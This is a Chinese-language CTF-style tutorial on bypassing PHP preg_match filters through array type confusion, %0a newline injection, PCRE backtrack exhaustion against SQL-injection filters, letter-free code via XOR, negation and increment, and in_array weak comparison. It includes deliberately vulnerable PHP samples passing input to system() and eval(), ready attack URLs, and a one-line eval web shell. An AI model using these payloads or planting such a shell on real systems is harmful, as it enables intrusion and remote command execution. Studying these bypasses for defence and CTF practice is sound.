## 正则表达式绕过
### 先了解正则表达式
  正则表达式一般有三个部分组成
  /模式主体/修饰符
  - **定界符**：同城用斜杠包裹/···/如（/[0-9]/）
  - **模式主体**：普通字符、元字符、字符集、量词等组合构成的匹配规则
  - **修饰符**：放在结束定界符之后，用来控制匹配模式（如/abc/i中的i）
#### 核心语法速查表
  | 类别 | 语法 | 说明 | 示例 |
| :--- | :--- | :--- | :--- |
| **字符集** | `[abc]` | 匹配方括号中的任意单个字符 | 匹配 `a`、`b` 或 `c` |
| | `[^abc]` | 取反匹配，匹配除方括号内字符外的任意字符 | 匹配除 `a`、`b`、`c` 以外的字符 |
| | `[a-z]` | 匹配指定范围内的任意小写字母 | `[a-z]` 匹配从 a 到 z 的任意字母 |
| | `[0-9]` | 匹配指定范围内的任意数字 | 匹配 0 到 9 的任意一位数字 |
| **预定义字符** | `.` | 匹配除换行符外的任意单个字符 | `a.c` 可匹配 `abc`、`a-c` 等 |
| | `\d` | 匹配任意阿拉伯数字，等价于 `[0-9]` | `\d\d` 匹配两个连续数字 |
| | `\D` | 匹配任意非数字字符，等价于 `[^0-9]` | 匹配字母、符号或空格 |
| | `\w` | 匹配单词字符（字母、数字、下划线），等价于 `[a-zA-Z0-9_]` | 匹配常见标识符字符 |
| | `\W` | 匹配任意非单词字符，等价于 `[^a-zA-Z0-9_]` | 匹配标点、空格、特殊符号 |
| | `\s` | 匹配任意空白符（空格、制表符 `\t`、换行 `\n` 等） | 匹配缩进或空行分隔符 |
| | `\S` | 匹配任意非空白字符 | 匹配可见文本字符 |
| **位置锚点** | `^` | 匹配字符串的开头（多行模式下匹配行首） | `^hello` 必须以 hello 开头 |
| | `$` | 匹配字符串的结尾（多行模式下匹配行尾） | `end$` 必须以 end 结尾 |
| | `\b` | 匹配单词边界 | `\bcat\b` 仅匹配独立单词 cat |
| | `\B` | 匹配非单词边界 | `\Bcat` 匹配 locate 中的 cat |
| **量词（匹配次数）** | `*` | 匹配前面的元素 0 次或多次，等价于 `{0,}` | `ab*c` 匹配 `ac`、`abc`、`abbc` |
| | `+` | 匹配前面的元素至少 1 次，等价于 `{1,}` | `ab+c` 匹配 `abc`、`abbc`（不匹配 `ac`） |
| | `?` | 匹配前面的元素 0 次或 1 次（可选），等价于 `{0,1}` | `colou?r` 可匹配 `color` 和 `colour` |
| | `{n}` | 精确匹配前面的元素 n 次 | `\d{4}` 匹配 4 位数字年份 |
| | `{n,}` | 匹配前面的元素至少 n 次 | `\d{6,}` 匹配 6 位及以上数字 |
| | `{n,m}` | 匹配前面的元素 n 到 m 次 | `\d{3,5}` 匹配 3 至 5 位数字 |
| **分组与分支** | `(...)` | 捕获分组，将内容作为整体并保存匹配值 | `(ha)+` 匹配 `ha`、`haha` 等 |
| | `(?:...)` | 非捕获分组，将内容作为整体但不保存匹配值 | 用于仅逻辑组合、无需提取内容的场景 |
| | `\|` | 逻辑或（分支），匹配左侧或右侧内容 | `cat\|dog` 匹配 cat 或 dog |
| **转义符** | `\` | 转义特殊元字符，使其作为普通字符匹配 | `\.` 匹配字面点号，`\$` 匹配美元符 |
| **常用修饰符** | `i` | 忽略大小写（Case-insensitive） | `/[a-z]/i` 同时匹配大写字母 |
| | `m` | 多行模式（Multi-line），使 `^` 和 `$` 匹配每行起止 | 按行匹配文本日志或段落 |
| | `s` | 单行模式（Dot All），使元字符 `.` 能够匹配换行符 | 跨行匹配长文本内容 |
| | `g` | 全局匹配（Global），查找所有符合条件的匹配项 | 找出全文中所有出现的匹配项 |
### 数组绕过（类型混淆）
#### 原理
preg_match的函数原型要求传入 的待匹配文本是字符串，如果要传入一个数组，函数就无法解析，就会触发一个Warning并且返回一个false
#### 例
```php
<?php
$num=$_GET['num'];

if(preg_match("/[0-9]/", $num)){
    die("no no no!");
}
elseif(intval($num)){
    echo $flag;
}
?>
```
这里的preg_match函数是要求出入的第二个参数是字符串，如果是数字就不会进入if语句了，第二层的intval函数逻辑是如果传入的是非空数组，intval就会直接返回1
所以我们可以将构造payload
``` HTTP
http://target-site.com/index.php?num[]=1
```
### 换行符阶段与位置锚点绕过（%0a注入）
#### 原理
- 元字符号.默认不匹配换行符（除非开启上面说的's'修饰符）
- 锚点 ^ 和 $ 默认只代表全文首尾，但在没有开启 m 修饰符时，$ 允许匹配末尾紧挨着的换行符（PHP PCRE 特性：$ 默认会吞掉末尾单个 \n）。
#### 例1
``` php
<?php
$cmd = $_GET['cmd'];

// 要求必须以 admin 开头，后面跟着任意参数
// 但没有加 /s 修饰符！
if (preg_match("/^admin.*$/", $cmd)) {
    // 过滤通过后，如果直接将输入放进命令执行或 eval
    system($cmd);
} else {
    die("Permission denied: You must be admin!");
}
?>
```
这里的题目限制参数cmd开头必须是admin，且没有加s修饰符，就可以使用换行符进行绕过，这里的system直接执行了cmd，就可以根据这样构造payload
``` HTTP
http://target-site.com/index.php?cmd=admin%0als
```
#### 例2
``` php
<?php
$filename = $_GET['file'];

// 要求文件名必须是纯字母，从头到尾 ^...$
if (preg_match("/^[a-z]+$/", $filename)) {
    // 写入文件
    file_put_contents($filename, "<?php phpinfo(); ?>");
    echo "File created: " . $filename;
} else {
    die("Invalid filename!");
}
?>
```
这里代码要求文件名必须是纯字母，可以构造payload    ?file=shell%0a
^[a-z]+$ 配合 %0a 只能证明换行符可以绕过结尾的 $ 校验。由于生成的只是无后缀的 shell 文件，Web 服务器默认不会解析它。要真正执行代码，必须依赖后端的文件包含漏洞（include）或者后端自带的后缀拼接逻辑。

### PCRE回溯次数耗尽（ReDoS/缓冲区溢出）
#### 原理
php的PCRE正则引擎基于NFA，遇到复杂的贪婪/非贪婪匹配规则时会不断回溯。php配置里面有一个安全的阈值：
pcre.backtrack_limit = 1000000; # 默认回溯上限 100 万次
如果回溯计算次数超过该上限，preg_match 会中止匹配并返回 false。
``` php
if (!preg_match("/UNION.+?SELECT/is", $input)) {
    // 执行危险查询
}
```
这里的代码是针对sql注入的如果有union select的字符就进入if语句，但我们可以利用PCRE回溯来绕过，让union/*和*/select之间填充海量字符进行多次回溯，让返回结果为flase，达到我们的效果
``` python
payload = "UNION/*" + "a" * 1000000 + "*/SELECT"
```

### 黑名单限制下的无字母数字绕过
``` php
if (preg_match("/[a-zA-Z0-9]/", $code)) {
    die("Hacker!");
}
eval($code);
```
解决方式
- 1.异或：“^”的ASCII码值为94（二进制：01011110）"~"的ASCII值为126（二进制：01111110）两者异或即01011110^01111110=00100000(十进制为32，即空格)
- 2.取反：是指将每个字节的8为二进制位全部反转0变1，1变0，得到一个新的字节
- 3.自增：
##### 1. 底层原理
PHP 在处理字符串的自增操作（++）时遵循了类似 Perl 的“字母进位”特性：

如果对字符串 'A' 进行自增：$a = 'A'; $a++;，$a 的值会变成 'B'。

再次 $a++，值会变成 'C'，依此类推，直到 'Z'。

小写字母同样支持该规则：'a'++ 变成 'b'。

但核心难点在于：在没有字母可用的前提下，如何拿到第一个字母 'A'？

##### 2. “空手套白狼”拿到基础字符
利用 PHP 数组强转字符串的特性：

$a = []; —— 定义一个空数组（没有使用字母或数字）。

$a = "$a"; —— 在双引号内对数组进行字符串插值，PHP 会触发一个 Notice 提示，并将数组隐式转换为字符串 "Array"。

$b = $a[_]; —— 提取字符串的第一个字符（在 PHP 历史版本中未定义的常量 _ 会被当作字符串 "_" 处理，或利用数学运算 $b = $a[($a == $a)]; 取下标）：

提取到字符 'A'。

##### 3. 构造流程
获得字符 'A'。

通过连续执行 $a++，将当前字符逐步推演为 'B'、'C'、'D' 直至需要的各个字母。

将推演出来的字母保存到不同的变量中。

使用字符串连接符 . 将变量组合成完整的函数名称与参数。

最终通过 $func($arg) 形式完成调用。

## 弱比较
``` php
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}
```
这里的in_array的原型
``` php
in_array(mixed $needle, array $haystack, bool $strict = false): bool
```
- 他的第三个参数$strict默认是false
- 也就是说，他在检察$needle否在数组$haystack中时，使用的时==（弱比较）
这个代码里面的array_push函数是将第二个参数加到第一个数组里面，而rand函数时得到1到$i的任意一个数，而file_put_content函数是生成将第二个参数写在名为第一个参数的文件，之后可以直接访问这个文件执行命令
构造payload
GET请求参数
``` Plaintext
?n=1.php
```
POST请求内容
``` Plaintext
content=<?php @eval($_POST['cmd']); ?>
```
